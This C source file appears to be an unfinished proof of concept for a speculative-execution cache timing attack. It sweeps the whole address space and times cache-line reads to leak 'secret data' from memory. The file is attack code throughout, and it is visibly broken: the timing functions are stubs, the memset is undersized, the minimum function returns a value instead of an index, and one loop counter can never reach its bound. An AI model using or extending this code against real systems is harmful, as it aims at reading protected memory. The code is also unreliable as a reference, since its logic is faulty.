#include <stdio.h>
#include <stdint.h>

#include "cache.h"

uint8_t attackArray[256*L1_LINE_SZ_BYTES];
uint64_t results[256];

uint8_t min(uint64_t* results, uint64_t sz){
    uint64_t minVal = ~0;
    for (uint64_t i = 0; i < sz; ++i){
        if (minVal > results[i]){
            minVal = results[i];
        }
    }
    return minVal;
}

// temp function until I can get the .S file working
uint64_t readTime(){
    return 0;
}

// temp function until I can get the .S file working
void frameDump(){
    return;
}

void specFunc(uint64_t addr){
    frameDump();
    uint8_t dummy = attackArray[(*((uint64_t*)addr))*L1_LINE_SZ_BYTES]; 
}

int main(void){
    // clear the results
    memset(results, 0, 256*sizeof(uint8_t));

    for (uint64_t addr = 0x0; addr < 0xFFFFFFFFFFFFFFFF; ++addr){
        // run the particular attack sequence
        specFunc(addr);
        
        // read in the secret data
        for (uint8_t i = 0; i < 256; ++i){
            uint64_t start = readTime();
            uint8_t dummy = attackArray[i*L1_LINE_SZ_BYTES];
            uint64_t end = readTime();
        
            results[i] = end - start;
        }
        
        // Note: Could do this using a threshold value for a hit
        uint8_t secret = min(results, 256);
    }
}